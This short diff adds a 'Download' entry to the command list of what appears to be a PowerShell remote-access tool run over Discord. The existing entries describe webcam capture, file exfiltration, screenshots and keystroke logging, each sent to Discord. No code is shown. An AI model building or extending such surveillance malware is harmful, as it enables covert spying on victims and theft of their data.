@@ -56,6 +56,7 @@ $script:jsonPayload = @{
 - **TakePicture**: Send a webcam picture and send to Discord
 - **Exfiltrate**: Send various files. (see ExtraInfo)
 - **Upload**: Upload a file. (see ExtraInfo)
+- **Download**: Download a file. (attach a file with the command)
 - **Screenshot**: Sends a screenshot of the desktop and send to Discord
 - **Keycapture**: Capture Keystrokes and send to Discord
 
